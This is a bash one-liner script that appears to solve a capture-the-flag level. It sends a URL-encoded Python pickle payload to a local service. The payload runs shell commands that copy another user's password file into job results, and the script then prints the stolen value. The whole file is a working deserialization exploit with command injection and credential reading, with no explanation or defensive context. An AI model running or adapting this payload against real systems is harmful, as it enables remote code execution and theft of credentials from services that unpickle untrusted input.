#!/usr/bin/env bash
curl -s localhost:9020 -d "fake; job: cos%0Asystem%0A%28S%27for%20i%20in%20%60ls%20/tmp/level05/jobs%60%3B%20do%20sed%20%22s%2Cdata%3A%20%5B%5E%3B%5D%2A%3B%20job%3A%2Cdata%3A%20%60/bin/cat%20/home/level06/.password%60%3B%20job%3A%2Cg%22%20/tmp/level05/jobs/%24i%20%3E%20/tmp/level05/results/%24i%3B%20done%27%0AtR.%27%0AtR." | grep result | cut -d'"' -f4
